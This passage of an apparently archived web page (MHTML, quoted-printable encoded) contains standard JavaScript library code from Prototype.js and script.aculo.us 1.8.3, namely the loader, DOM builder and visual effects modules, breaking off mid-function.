  instanceMethods.getElementsByClassName =3D Prototype.BrowserFeatures.XPat=
h ?
  function(element, className) {
    className =3D className.toString().strip();
    var cond =3D /\s/.test(className) ? $w(className).map(iter).join('') :=
 iter(className);
    return cond ? document._getElementsByXPath('.//*' + cond, element) : [];
  } : function(element, className) {
    className =3D className.toString().strip();
    var elements =3D [], classNames =3D (/\s/.test(className) ? $w(classNam=
e) : null);
    if (!classNames && !className) return elements;

    var nodes =3D $(element).getElementsByTagName('*');
    className =3D ' ' + className + ' ';

    for (var i =3D 0, child, cn; child =3D nodes[i]; i++) {
      if (child.className && (cn =3D ' ' + child.className + ' ') && (cn.in=
clude(className) ||
          (classNames && classNames.all(function(name) {
            return !name.toString().blank() && cn.include(' ' + name + ' ');
          }))))
        elements.push(Element.extend(child));
    }
    return elements;
  };

  return function(className, parentElement) {
    return $(parentElement || document.body).getElementsByClassName(classNa=
me);
  };
}(Element.Methods);

/*-------------------------------------------------------------------------=
-*/

Element.ClassNames =3D Class.create();
Element.ClassNames.prototype =3D {
  initialize: function(element) {
    this.element =3D $(element);
  },

  _each: function(iterator) {
    this.element.className.split(/\s+/).select(function(name) {
      return name.length > 0;
    })._each(iterator);
  },

  set: function(className) {
    this.element.className =3D className;
  },

  add: function(classNameToAdd) {
    if (this.include(classNameToAdd)) return;
    this.set($A(this).concat(classNameToAdd).join(' '));
  },

  remove: function(classNameToRemove) {
    if (!this.include(classNameToRemove)) return;
    this.set($A(this).without(classNameToRemove).join(' '));
  },

  toString: function() {
    return $A(this).join(' ');
  }
};

Object.extend(Element.ClassNames.prototype, Enumerable);

/*-------------------------------------------------------------------------=
-*/

------=_Part_D48E12B_E642554.1364831838822
Content-Location: http://static.yetti.co.uk/js/libs/externals/scriptaculous/1.8.3/scriptaculous.js
Content-Transfer-Encoding: quoted-printable
Content-Type: text/javascript

// script.aculo.us scriptaculous.js v1.8.3, Thu Oct 08 11:23:33 +0200 2009

// Copyright (c) 2005-2009 Thomas Fuchs (http://script.aculo.us, http://mir=
.aculo.us)
//
// Permission is hereby granted, free of charge, to any person obtaining
// a copy of this software and associated documentation files (the
// "Software"), to deal in the Software without restriction, including
// without limitation the rights to use, copy, modify, merge, publish,
// distribute, sublicense, and/or sell copies of the Software, and to
// permit persons to whom the Software is furnished to do so, subject to
// the following conditions:
//
// The above copyright notice and this permission notice shall be
// included in all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
// EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
// MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
// NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
// LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
// OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
// WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
//
// For details, see the script.aculo.us web site: http://script.aculo.us/

var Scriptaculous =3D {
  Version: '1.8.3',
  require: function(libraryName) {
    try{
      // inserting via DOM fails in Safari 2.0, so brute force approach
      document.write('<script type=3D"text/javascript" src=3D"'+libraryName=
+'"><\/script>');
    } catch(e) {
      // for xhtml+xml served content, fall back to DOM methods
      var script =3D document.createElement('script');
      script.type =3D 'text/javascript';
      script.src =3D libraryName;
      document.getElementsByTagName('head')[0].appendChild(script);
    }
  },
  REQUIRED_PROTOTYPE: '1.6.0.3',
  load: function() {
    function convertVersionString(versionString) {
      var v =3D versionString.replace(/_.*|\./g, '');
      v =3D parseInt(v + '0'.times(4-v.length));
      return versionString.indexOf('_') > -1 ? v-1 : v;
    }

    if((typeof Prototype=3D=3D'undefined') ||
       (typeof Element =3D=3D 'undefined') ||
       (typeof Element.Methods=3D=3D'undefined') ||
       (convertVersionString(Prototype.Version) <
        convertVersionString(Scriptaculous.REQUIRED_PROTOTYPE)))
       throw("script.aculo.us requires the Prototype JavaScript framework=
 >=3D " +
        Scriptaculous.REQUIRED_PROTOTYPE);

    var js =3D /scriptaculous\.js(\?.*)?$/;
    $$('head script[src]').findAll(function(s) {
      return s.src.match(js);
    }).each(function(s) {
      var path =3D s.src.replace(js, ''),
      includes =3D s.src.match(/\?.*load=3D([a-z,]*)/);
      (includes ? includes[1] : 'builder,effects,dragdrop,controls,slider,s=
ound').split(',').each(
       function(include) { Scriptaculous.require(path+include+'.js') });
    });
  }
};

Scriptaculous.load();
------=_Part_D48E12B_E642554.1364831838822
Content-Location: http://static.yetti.co.uk/js/libs/externals/scriptaculous/1.8.3/builder.js
Content-Transfer-Encoding: quoted-printable
Content-Type: text/javascript

// script.aculo.us builder.js v1.8.3, Thu Oct 08 11:23:33 +0200 2009

// Copyright (c) 2005-2009 Thomas Fuchs (http://script.aculo.us, http://mir=
.aculo.us)
//
// script.aculo.us is freely distributable under the terms of an MIT-style=
 license.
// For details, see the script.aculo.us web site: http://script.aculo.us/

var Builder =3D {
  NODEMAP: {
    AREA: 'map',
    CAPTION: 'table',
    COL: 'table',
    COLGROUP: 'table',
    LEGEND: 'fieldset',
    OPTGROUP: 'select',
    OPTION: 'select',
    PARAM: 'object',
    TBODY: 'table',
    TD: 'table',
    TFOOT: 'table',
    TH: 'table',
    THEAD: 'table',
    TR: 'table'
  },
  // note: For Firefox < 1.5, OPTION and OPTGROUP tags are currently broken,
  //       due to a Firefox bug
  node: function(elementName) {
    elementName =3D elementName.toUpperCase();

    // try innerHTML approach
    var parentTag =3D this.NODEMAP[elementName] || 'div';
    var parentElement =3D document.createElement(parentTag);
    try { // prevent IE "feature": http://dev.rubyonrails.org/ticket/2707
      parentElement.innerHTML =3D "<" + elementName + "></" + elementName=
 + ">";
    } catch(e) {}
    var element =3D parentElement.firstChild || null;

    // see if browser added wrapping tags
    if(element && (element.tagName.toUpperCase() !=3D elementName))
      element =3D element.getElementsByTagName(elementName)[0];

    // fallback to createElement approach
    if(!element) element =3D document.createElement(elementName);

    // abort if nothing could be created
    if(!element) return;

    // attributes (or text)
    if(arguments[1])
      if(this._isStringOrNumber(arguments[1]) ||
        (arguments[1] instanceof Array) ||
        arguments[1].tagName) {
          this._children(element, arguments[1]);
        } else {
          var attrs =3D this._attributes(arguments[1]);
          if(attrs.length) {
            try { // prevent IE "feature": http://dev.rubyonrails.org/ticke=
t/2707
              parentElement.innerHTML =3D "<" +elementName + " " +
                attrs + "></" + elementName + ">";
            } catch(e) {}
            element =3D parentElement.firstChild || null;
            // workaround firefox 1.0.X bug
            if(!element) {
              element =3D document.createElement(elementName);
              for(attr in arguments[1])
                element[attr =3D=3D 'class' ? 'className' : attr] =3D argum=
ents[1][attr];
            }
            if(element.tagName.toUpperCase() !=3D elementName)
              element =3D parentElement.getElementsByTagName(elementName)[0=
];
          }
        }

    // text, or array of children
    if(arguments[2])
      this._children(element, arguments[2]);

     return $(element);
  },
  _text: function(text) {
     return document.createTextNode(text);
  },

  ATTR_MAP: {
    'className': 'class',
    'htmlFor': 'for'
  },

  _attributes: function(attributes) {
    var attrs =3D [];
    for(attribute in attributes)
      attrs.push((attribute in this.ATTR_MAP ? this.ATTR_MAP[attribute] :=
 attribute) +
          '=3D"' + attributes[attribute].toString().escapeHTML().gsub(/"/,'=
&quot;') + '"');
    return attrs.join(" ");
  },
  _children: function(element, children) {
    if(children.tagName) {
      element.appendChild(children);
      return;
    }
    if(typeof children=3D=3D'object') { // array can hold nodes and text
      children.flatten().each( function(e) {
        if(typeof e=3D=3D'object')
          element.appendChild(e);
        else
          if(Builder._isStringOrNumber(e))
            element.appendChild(Builder._text(e));
      });
    } else
      if(Builder._isStringOrNumber(children))
        element.appendChild(Builder._text(children));
  },
  _isStringOrNumber: function(param) {
    return(typeof param=3D=3D'string' || typeof param=3D=3D'number');
  },
  build: function(html) {
    var element =3D this.node('div');
    $(element).update(html.strip());
    return element.down();
  },
  dump: function(scope) {
    if(typeof scope !=3D 'object' && typeof scope !=3D 'function') scope =
=3D window; //global scope

    var tags =3D ("A ABBR ACRONYM ADDRESS APPLET AREA B BASE BASEFONT BDO=
 BIG BLOCKQUOTE BODY " +
      "BR BUTTON CAPTION CENTER CITE CODE COL COLGROUP DD DEL DFN DIR DIV=
 DL DT EM FIELDSET " +
      "FONT FORM FRAME FRAMESET H1 H2 H3 H4 H5 H6 HEAD HR HTML I IFRAME IMG=
 INPUT INS ISINDEX "+
      "KBD LABEL LEGEND LI LINK MAP MENU META NOFRAMES NOSCRIPT OBJECT OL=
 OPTGROUP OPTION P "+
      "PARAM PRE Q S SAMP SCRIPT SELECT SMALL SPAN STRIKE STRONG STYLE SUB=
 SUP TABLE TBODY TD "+
      "TEXTAREA TFOOT TH THEAD TITLE TR TT U UL VAR").split(/\s+/);

    tags.each( function(tag){
      scope[tag] =3D function() {
        return Builder.node.apply(Builder, [tag].concat($A(arguments)));
      };
    });
  }
};
------=_Part_D48E12B_E642554.1364831838822
Content-Location: http://static.yetti.co.uk/js/libs/externals/scriptaculous/1.8.3/effects.js
Content-Transfer-Encoding: quoted-printable
Content-Type: text/javascript

// script.aculo.us effects.js v1.8.3, Thu Oct 08 11:23:33 +0200 2009

// Copyright (c) 2005-2009 Thomas Fuchs (http://script.aculo.us, http://mir=
.aculo.us)
// Contributors:
//  Justin Palmer (http://encytemedia.com/)
//  Mark Pilgrim (http://diveintomark.org/)
//  Martin Bialasinki
//
// script.aculo.us is freely distributable under the terms of an MIT-style=
 license.
// For details, see the script.aculo.us web site: http://script.aculo.us/

// converts rgb() and #xxx to #xxxxxx format,
// returns self (or first argument) if not convertable
String.prototype.parseColor =3D function() {
  var color =3D '#';
  if (this.slice(0,4) =3D=3D 'rgb(') {
    var cols =3D this.slice(4,this.length-1).split(',');
    var i=3D0; do { color +=3D parseInt(cols[i]).toColorPart() } while (++i=
<3);
  } else {
    if (this.slice(0,1) =3D=3D '#') {
      if (this.length=3D=3D4) for(var i=3D1;i<4;i++) color +=3D (this.charA=
t(i) + this.charAt(i)).toLowerCase();
      if (this.length=3D=3D7) color =3D this.toLowerCase();
    }
  }
  return (color.length=3D=3D7 ? color : (arguments[0] || this));
};

/*-------------------------------------------------------------------------=
-*/

Element.collectTextNodes =3D function(element) {
  return $A($(element).childNodes).collect( function(node) {
    return (node.nodeType=3D=3D3 ? node.nodeValue :
      (node.hasChildNodes() ? Element.collectTextNodes(node) : ''));
  }).flatten().join('');
};

Element.collectTextNodesIgnoreClass =3D function(element, className) {
  return $A($(element).childNodes).collect( function(node) {
    return (node.nodeType=3D=3D3 ? node.nodeValue :
      ((node.hasChildNodes() && !Element.hasClassName(node,className)) ?
        Element.collectTextNodesIgnoreClass(node, className) : ''));
  }).flatten().join('');
};

Element.setContentZoom =3D function(element, percent) {
  element =3D $(element);
  element.setStyle({fontSize: (percent/100) + 'em'});
  if (Prototype.Browser.WebKit) window.scrollBy(0,0);
  return element;
};

Element.getInlineOpacity =3D function(element){
  return $(element).style.opacity || '';
};

Element.forceRerendering =3D function(element) {
  try {
    element =3D $(element);
    var n =3D document.createTextNode(' ');
    element.appendChild(n);
    element.removeChild(n);
  } catch(e) { }
};

/*-------------------------------------------------------------------------=
-*/

var Effect =3D {
  _elementDoesNotExistError: {
    name: 'ElementDoesNotExistError',
    message: 'The specified DOM element does not exist, but is required for=
 this effect to operate'
  },
  Transitions: {
    linear: Prototype.K,
    sinoidal: function(pos) {
      return (-Math.cos(pos*Math.PI)/2) + .5;
    },
    reverse: function(pos) {
      return 1-pos;
    },
    flicker: function(pos) {
      var pos =3D ((-Math.cos(pos*Math.PI)/4) + .75) + Math.random()/4;
      return pos > 1 ? 1 : pos;
    },
    wobble: function(pos) {
      return (-Math.cos(pos*Math.PI*(9*pos))/2) + .5;
    },
    pulse: function(pos, pulses) {
      return (-Math.cos((pos*((pulses||5)-.5)*2)*Math.PI)/2) + .5;
    },
    spring: function(pos) {
      return 1 - (Math.cos(pos * 4.5 * Math.PI) * Math.exp(-pos * 6));
    },
    none: function(pos) {
      return 0;
    },
    full: function(pos) {
      return 1;
    }
  },
  DefaultOptions: {
    duration:   1.0,   // seconds
    fps:        100,   // 100=3D assume 66fps max.
    sync:       false, // true for combining
    from:       0.0,
    to:         1.0,
    delay:      0.0,
    queue:      'parallel'
  },
  tagifyText: function(element) {
    var tagifyStyle =3D 'position:relative';
    if (Prototype.Browser.IE) tagifyStyle +=3D ';zoom:1';

    element =3D $(element);
    $A(element.childNodes).each( function(child) {
      if (child.nodeType=3D=3D3) {
        child.nodeValue.toArray().each( function(character) {
          element.insertBefore(
            new Element('span', {style: tagifyStyle}).update(
              character =3D=3D ' ' ? String.fromCharCode(160) : character),
              child);
        });
        Element.remove(child);
      }
    });
  },
  multiple: function(element, effect) {
    var elements;
    if (((typeof element =3D=3D 'object') ||
        Object.isFunction(element)) &&
       (element.length))
      elements =3D element;
    else
      elements =3D $(element).childNodes;

    var options =3D Object.extend({
      speed: 0.1,
      delay: 0.0
    }, arguments[2] || { });
    var masterDelay =3D options.delay;

    $A(elements).each( function(element, index) {
      new effect(element, Object.extend(options, { delay: index * options.s=
peed + masterDelay }));
    });
  },
  PAIRS: {
    'slide':  ['SlideDown','SlideUp'],
    'blind':  ['BlindDown','BlindUp'],
    'appear': ['Appear','Fade']
  },
  toggle: function(element, effect, options) {
    element =3D $(element);
    effect  =3D (effect || 'appear').toLowerCase();
   =20
    return Effect[ Effect.PAIRS[ effect ][ element.visible() ? 1 : 0 ] ](el=
ement, Object.extend({
      queue: { position:'end', scope:(element.id || 'global'), limit: 1 }
    }, options || {}));
  }
};

Effect.DefaultOptions.transition =3D Effect.Transitions.sinoidal;

/* ------------- core effects ------------- */

Effect.ScopedQueue =3D Class.create(Enumerable, {
  initialize: function() {
    this.effects  =3D [];
    this.interval =3D null;
  },
  _each: function(iterator) {
    this.effects._each(iterator);
  },
  add: function(effect) {
    var timestamp =3D new Date().getTime();

    var position =3D Object.isString(effect.options.queue) ?
      effect.options.queue : effect.options.queue.position;

    switch(position) {
      case 'front':
        // move unstarted effects after this effect
        this.effects.findAll(function(e){ return e.state=3D=3D'idle' }).eac=
h( function(e) {
            e.startOn  +=3D effect.finishOn;
            e.finishOn +=3D effect.finishOn;
          });
        break;
      case 'with-last':
        timestamp =3D this.effects.pluck('startOn').max() || timestamp;
        break;
      case 'end':
        // start effect after last queued effect has finished
        timestamp =3D this.effects.pluck('finishOn').max() || timestamp;
        break;
    }

    effect.startOn  +=3D timestamp;
    effect.finishOn +=3D timestamp;

    if (!effect.options.queue.limit || (this.effects.length < effect.option=
s.queue.limit))
      this.effects.push(effect);

    if (!this.interval)
      this.interval =3D setInterval(this.loop.bind(this), 15);
  },
  remove: function(effect) {
    this.effects =3D this.effects.reject(function(e) { return e=3D=3Deffect=
 });
    if (this.effects.length =3D=3D 0) {
      clearInterval(this.interval);
      this.interval =3D null;
    }
  },
  loop: function() {
    var timePos =3D new Date().getTime();
    for(var i=3D0, len=3Dthis.effects.length;i<len;i++)
      this.effects[i] && this.effects[i].loop(timePos);
  }
});

Effect.Queues =3D {
  instances: $H(),
  get: function(queueName) {
    if (!Object.isString(queueName)) return queueName;

    return this.instances.get(queueName) ||
      this.instances.set(queueName, new Effect.ScopedQueue());
  }
};
Effect.Queue =3D Effect.Queues.get('global');

Effect.Base =3D Class.create({
  position: null,
  start: function(options) {
    if (options && options.transition =3D=3D=3D false) options.transition=
 =3D Effect.Transitions.linear;
    this.options      =3D Object.extend(Object.extend({ },Effect.DefaultOpt=
ions), options || { });
    this.currentFrame =3D 0;
    this.state        =3D 'idle';
    this.startOn      =3D this.options.delay*1000;
    this.finishOn     =3D this.startOn+(this.options.duration*1000);
    this.fromToDelta  =3D this.options.to-this.options.from;
    this.totalTime    =3D this.finishOn-this.startOn;
    this.totalFrames  =3D this.options.fps*this.options.duration;

    this.render =3D (function() {
      function dispatch(effect, eventName) {
        if (effect.options[eventName + 'Internal'])
          effect.options[eventName + 'Internal'](effect);
        if (effect.options[eventName])
          effect.options[eventName](effect);
      }

      return function(pos) {
        if (this.state =3D=3D=3D "idle") {
          this.state =3D "running";
          dispatch(this, 'beforeSetup');
          if (this.setup) this.setup();
          dispatch(this, 'afterSetup');
        }
        if (this.state =3D=3D=3D "running") {
          pos =3D (this.options.transition(pos) * this.fromToDelta) + this.=
options.from;
          this.position =3D pos;
          dispatch(this, 'beforeUpdate');
          if (this.update) this.update(pos);
          dispatch(this, 'afterUpdate');
        }
      };
    })();

    this.event('beforeStart');
    if (!this.options.sync)
      Effect.Queues.get(Object.isString(this.options.queue) ?
        'global' : this.options.queue.scope).add(this);
  },
  loop: function(timePos) {
    if (timePos >=3D this.startOn) {
      if (timePos >=3D this.finishOn) {
        this.render(1.0);
        this.cancel();
        this.event('beforeFinish');
        if (this.finish) this.finish();
        this.event('afterFinish');
        return;
      }
      var pos   =3D (timePos - this.startOn) / this.totalTime,
          frame =3D (pos * this.totalFrames).round();
      if (frame > this.currentFrame) {
        this.render(pos);
        this.currentFrame =3D frame;
      }
    }
  },
  cancel: function() {
    if (!this.options.sync)
      Effect.Queues.get(Object.isString(this.options.queue) ?
        'global' : this.options.queue.scope).remove(this);
    this.state =3D 'finished';
  },
  event: function(eventName) {
    if (this.options[eventName + 'Internal']) this.options[eventName + 'Int=
ernal'](this);
    if (this.options[eventName]) this.options[eventName](this);
  },
  inspect: function() {
    var data =3D $H();
    for(property in this)
      if (!Object.isFunction(this[property])) data.set(property, this[prope=
rty]);
    return '#<Effect:' + data.inspect() + ',options:' + $H(this.options).in=
spect() + '>';
  }
});

Effect.Parallel =3D Class.create(Effect.Base, {
  initialize: function(effects) {
    this.effects =3D effects || [];
    this.start(arguments[1]);
  },
  update: function(position) {
    this.effects.invoke('render', position);
  },
  finish: function(position) {
    this.effects.each( function(effect) {
      effect.render(1.0);
      effect.cancel();
      effect.event('beforeFinish');
      if (effect.finish) effect.finish(position);
      effect.event('afterFinish');
    });
  }
});

Effect.Tween =3D Class.create(Effect.Base, {
  initialize: function(object, from, to) {
    object =3D Object.isString(object) ? $(object) : object;
    var args =3D $A(arguments), method =3D args.last(),
      options =3D args.length =3D=3D 5 ? args[3] : null;
    this.method =3D Object.isFunction(method) ? method.bind(object) :
      Object.isFunction(object[method]) ? object[method].bind(object) :
      function(value) { object[method] =3D value };
    this.start(Object.extend({ from: from, to: to }, options || { }));
  },
  update: function(position) {
    this.method(position);
  }
});

Effect.Event =3D Class.create(Effect.Base, {
  initialize: function() {
    this.start(Object.extend({ duration: 0 }, arguments[0] || { }));
  },
  update: Prototype.emptyFunction
});

Effect.Opacity =3D Class.create(Effect.Base, {
  initialize: function(element) {
    this.element =3D $(element);
    if (!this.element) throw(Effect._elementDoesNotExistError);
    // make this work on IE on elements without 'layout'
    if (Prototype.Browser.IE && (!this.element.currentStyle.hasLayout))
      this.element.setStyle({zoom: 1});
    var options =3D Object.extend({
      from: this.element.getOpacity() || 0.0,
      to:   1.0
    }, arguments[1] || { });
    this.start(options);
  },
  update: function(position) {
    this.element.setOpacity(position);
  }
});

Effect.Move =3D Class.create(Effect.Base, {
  initialize: function(element) {
    this.element =3D $(element);
    if (!this.element) throw(Effect._elementDoesNotExistError);
    var options =3D Object.extend({
      x:    0,
      y:    0,
      mode: 'relative'
    }, arguments[1] || { });
    this.start(options);
  },
  setup: function() {
    this.element.makePositioned();
    this.originalLeft =3D parseFloat(this.element.getStyle('left') || '0');
    this.originalTop  =3D parseFloat(this.element.getStyle('top')  || '0');
    if (this.options.mode =3D=3D 'absolute') {
      this.options.x =3D this.options.x - this.originalLeft;
      this.options.y =3D this.options.y - this.originalTop;
    }
  },
  update: function(position) {
    this.element.setStyle({
      left: (this.options.x  * position + this.originalLeft).round() + 'px',
      top:  (this.options.y  * position + this.originalTop).round()  + 'px'
    });
  }
});

// for backwards compatibility
Effect.MoveBy =3D function(element, toTop, toLeft) {
  return new Effect.Move(element,
    Object.extend({ x: toLeft, y: toTop }, arguments[3] || { }));
};

Effect.Scale =3D Class.create(Effect.Base, {
  initialize: function(element, percent) {
    this.element =3D $(element);
    if (!this.element) throw(Effect._elementDoesNotExistError);
    var options =3D Object.extend({
      scaleX: true,
      scaleY: true,
      scaleContent: true,
      scaleFromCenter: false,
      scaleMode: 'box',        // 'box' or 'contents' or { } with provided=
 values
      scaleFrom: 100.0,
      scaleTo:   percent
    }, arguments[2] || { });
    this.start(options);
  },
  setup: function() {
    this.restoreAfterFinish =3D this.options.restoreAfterFinish || false;
    this.elementPositioning =3D this.element.getStyle('position');

    this.originalStyle =3D { };
    ['top','left','width','height','fontSize'].each( function(k) {
      this.originalStyle[k] =3D this.element.style[k];
    }.bind(this));

    this.originalTop  =3D this.element.offsetTop;
    this.originalLeft =3D this.element.offsetLeft;

    var fontSize =3D this.element.getStyle('font-size') || '100%';
    ['em','px','%','pt'].each( function(fontSizeType) {
      if (fontSize.indexOf(fontSizeType)>0) {
        this.fontSize     =3D parseFloat(fontSize);
        this.fontSizeType =3D fontSizeType;
      }
    }.bind(this));

    this.factor =3D (this.options.scaleTo - this.options.scaleFrom)/100;

    this.dims =3D null;
    if (this.options.scaleMode=3D=3D'box')
      this.dims =3D [this.element.offsetHeight, this.element.offsetWidth];
    if (/^content/.test(this.options.scaleMode))
      this.dims =3D [this.element.scrollHeight, this.element.scrollWidth];
    if (!this.dims)
      this.dims =3D [this.options.scaleMode.originalHeight,
                   this.options.scaleMode.originalWidth];
  },
  update: function(position) {
    var currentScale =3D (this.options.scaleFrom/100.0) + (this.factor * po=
sition);
    if (this.options.scaleContent && this.fontSize)
      this.element.setStyle({fontSize: this.fontSize * currentScale + this.=
fontSizeType });
    this.setDimensions(this.dims[0] * currentScale, this.dims[1] * currentS=
cale);
  },
  finish: function(position) {
    if (this.restoreAfterFinish) this.element.setStyle(this.originalStyle);
  },
  setDimensions: function(height, width) {
    var d =3D { };
    if (this.options.scaleX) d.width =3D width.round() + 'px';
    if (this.options.scaleY) d.height =3D height.round() + 'px';
    if (this.options.scaleFromCenter) {
      var topd  =3D (height - this.dims[0])/2;
      var leftd =3D (width  - this.dims[1])/2;
      if (this.elementPositioning =3D=3D 'absolute') {
        if (this.options.scaleY) d.top =3D this.originalTop-topd + 'px';
        if (this.options.scaleX) d.left =3D this.originalLeft-leftd + 'px';
      } else {
        if (this.options.scaleY) d.top =3D -topd + 'px';
        if (this.options.scaleX) d.left =3D -leftd + 'px';
      }
    }
    this.element.setStyle(d);
  }
});

Effect.Highlight =3D Class.create(Effect.Base, {
  initialize: function(element) {
    this.element =3D $(element);
    if (!this.element) throw(Effect._elementDoesNotExistError);
    var options =3D Object.extend({ startcolor: '#ffff99' }, arguments[1]=
 || { });
    this.start(options);
  },
  setup: function() {
    // Prevent executing on elements not in the layout flow
    if (this.element.getStyle('display')=3D=3D'none') { this.cancel(); retu=
rn; }
    // Disable background image during the effect
    this.oldStyle =3D { };
    if (!this.options.keepBackgroundImage) {
      this.oldStyle.backgroundImage =3D this.element.getStyle('background-i=
mage');
      this.element.setStyle({backgroundImage: 'none'});
    }
    if (!this.options.endcolor)
      this.options.endcolor =3D this.element.getStyle('background-color').p=
arseColor('#ffffff');
    if (!this.options.restorecolor)
      this.options.restorecolor =3D this.element.getStyle('background-color=
');
    // init color calculations
    this._base  =3D $R(0,2).map(function(i){ return parseInt(this.options.s=
tartcolor.slice(i*2+1,i*2+3),16) }.bind(this));
    this._delta =3D $R(0,2).map(function(i){ return parseInt(this.options.e=
ndcolor.slice(i*2+1,i*2+3),16)-this._base[i] }.bind(this));
  },
  update: function(position) {
    this.element.setStyle({backgroundColor: $R(0,2).inject('#',function(m,v=
,i){
      return m+((this._base[i]+(this._delta[i]*position)).round().toColorPa=
rt()); }.bind(this)) });
  },
  finish: function() {
    this.element.setStyle(Object.extend(this.oldStyle, {
      backgroundColor: this.options.restorecolor
    }));
  }
});

Effect.ScrollTo =3D function(element) {
  var options =3D arguments[1] || { },
  scrollOffsets =3D document.viewport.getScrollOffsets(),
  elementOffsets =3D $(element).cumulativeOffset();

  if (options.offset) elementOffsets[1] +=3D options.offset;

  return new Effect.Tween(null,
    scrollOffsets.top,
    elementOffsets[1],
    options,
    function(p){ scrollTo(scrollOffsets.left, p.round()); }
  );
};

/* ------------- combination effects ------------- */

Effect.Fade =3D function(element) {
  element =3D $(element);
  var oldOpacity =3D element.getInlineOpacity();
  var options =3D Object.extend({
    from: element.getOpacity() || 1.0,
    to:   0.0,
    afterFinishInternal: function(effect) {
      if (effect.options.to!=3D0) return;
      effect.element.hide().setStyle({opacity: oldOpacity});
    }
  }, arguments[1] || { });
  return new Effect.Opacity(element,options);
};

Effect.Appear =3D function(element) {
  element =3D $(element);
  var options =3D Object.extend({
  from: (element.getStyle('display') =3D=3D 'none' ? 0.0 : element.getOpaci=
ty() || 0.0),
  to:   1.0,
  // force Safari to render floated elements properly
  afterFinishInternal: function(effect) {
    effect.element.forceRerendering();
  },
  beforeSetup: function(effect) {
    effect.element.setOpacity(effect.options.from).show();
  }}, arguments[1] || { });
  return new Effect.Opacity(element,options);
};

Effect.Puff =3D function(element) {
  element =3D $(element);
  var oldStyle =3D {
    opacity: element.getInlineOpacity(),
    position: element.getStyle('position'),
    top:  element.style.top,
    left: element.style.left,
    width: element.style.width,
    height: element.style.height
  };
  return new Effect.Parallel(
   [ new Effect.Scale(element, 200,
      { sync: true, scaleFromCenter: true, scaleContent: true, restoreAfter=
Finish: true }),
     new Effect.Opacity(element, { sync: true, to: 0.0 } ) ],
     Object.extend({ duration: 1.0,
      beforeSetupInternal: function(effect) {
        Position.absolutize(effect.effects[0].element);
      },
      afterFinishInternal: function(effect) {
         effect.effects[0].element.hide().setStyle(oldStyle); }
     }, arguments[1] || { })
   );
};

Effect.BlindUp =3D function(element) {
  element =3D $(element);
  element.makeClipping();
  return new Effect.Scale(element, 0,
    Object.extend({ scaleContent: false,
      scaleX: false,
      restoreAfterFinish: true,
      afterFinishInternal: function(effect) {
        effect.element.hide().undoClipping();
      }
    }, arguments[1] || { })
  );
};

Effect.BlindDown =3D function(element) {
  element =3D $(element);
  var elementDimensions =3D element.getDimensions();
  return new Effect.Scale(element, 100, Object.extend({
    scaleContent: false,
    scaleX: false,
    scaleFrom: 0,
    scaleMode: {originalHeight: elementDimensions.height, originalWidth: el=
ementDimensions.width},
    restoreAfterFinish: true,
    afterSetup: function(effect) {
      effect.element.makeClipping().setStyle({height: '0px'}).show();
    },
    afterFinishInternal: function(effect) {
      effect.element.undoClipping();
    }
  }, arguments[1] || { }));
};

Effect.SwitchOff =3D function(element) {
  element =3D $(element);
  var oldOpacity =3D element.getInlineOpacity();
  return new Effect.Appear(element, Object.extend({
    duration: 0.4,
    from: 0,
    transition: Effect.Transitions.flicker,
    afterFinishInternal: function(effect) {
      new Effect.Scale(effect.element, 1, {
        duration: 0.3, scaleFromCenter: true,
        scaleX: false, scaleContent: false, restoreAfterFinish: true,
        beforeSetup: function(effect) {
          effect.element.makePositioned().makeClipping();
        },
        afterFinishInternal: function(effect) {
          effect.element.hide().undoClipping().undoPositioned().setStyle({o=
pacity: oldOpacity});
        }
      });
    }
  }, arguments[1] || { }));
};

Effect.DropOut =3D function(element) {
  element =3D $(element);
  var oldStyle =3D {
    top: element.getStyle('top'),
    left: element.getStyle('left'),
    opacity: element.getInlineOpacity() };
  return new Effect.Parallel(
    [ new Effect.Move(element, {x: 0, y: 100, sync: true }),
      new Effect.Opacity(element, { sync: true, to: 0.0 }) ],
    Object.extend(
      { duration: 0.5,
        beforeSetup: function(effect) {
          effect.effects[0].element.makePositioned();
        },
        afterFinishInternal: function(effect) {
          effect.effects[0].element.hide().undoPositioned().setStyle(oldSty=
le);
        }
      }, arguments[1] || { }));
};

Effect.Shake =3D function(element) {
  element =3D $(element);
  var options =3D Object.extend({
    distance: 20,
    duration: 0.5
  }, arguments[1] || {});
  var distance =3D parseFloat(options.distance);
  var split =3D parseFloat(options.duration) / 10.0;
  var oldStyle =3D {
    top: element.getStyle('top'),
    left: element.getStyle('left') };
    return new Effect.Move(element,
      { x:  distance, y: 0, duration: split, afterFinishInternal: function(=
effect) {
    new Effect.Move(effect.element,
      { x: -distance*2, y: 0, duration: split*2,  afterFinishInternal: func=
tion(effect) {
    new Effect.Move(effect.element,
      { x:  distance*2, y: 0, duration: split*2,  afterFinishInternal: func=
tion(effect) {
    new Effect.Move(effect.element,
      { x: -distance*2, y: 0, duration: split*2,  afterFinishInternal: func=
tion(effect) {
    new Effect.Move(effect.element,
      { x:  distance*2, y: 0, duration: split*2,  afterFinishInternal: func=
tion(effect) {
    new Effect.Move(effect.element,
      { x: -distance, y: 0, duration: split, afterFinishInternal: function(=
effect) {
        effect.element.undoPositioned().setStyle(oldStyle);
  }}); }}); }}); }}); }}); }});
};

Effect.SlideDown =3D function(element) {
  element =3D $(element).cleanWhitespace();
  // SlideDown need to have the content of the element wrapped in a contain=
er element with fixed height!
  var oldInnerBottom =3D element.down().getStyle('bottom');
  var elementDimensions =3D element.getDimensions();
  return new Effect.Scale(element, 100, Object.extend({
    scaleContent: false,
    scaleX: false,
    scaleFrom: window.opera ? 0 : 1,
    scaleMode: {originalHeight: elementDimensions.height, originalWidth: el=
ementDimensions.width},
    restoreAfterFinish: true,
    afterSetup: function(effect) {
      effect.element.makePositioned();
      effect.element.down().makePositioned();
      if (window.opera) effect.element.setStyle({top: ''});
      effect.element.makeClipping().setStyle({height: '0px'}).show();
    },
    afterUpdateInternal: function(effect) {
      effect.element.down().setStyle({bottom:
        (effect.dims[0] - effect.element.clientHeight) + 'px' });
    },
    afterFinishInternal: function(effect) {
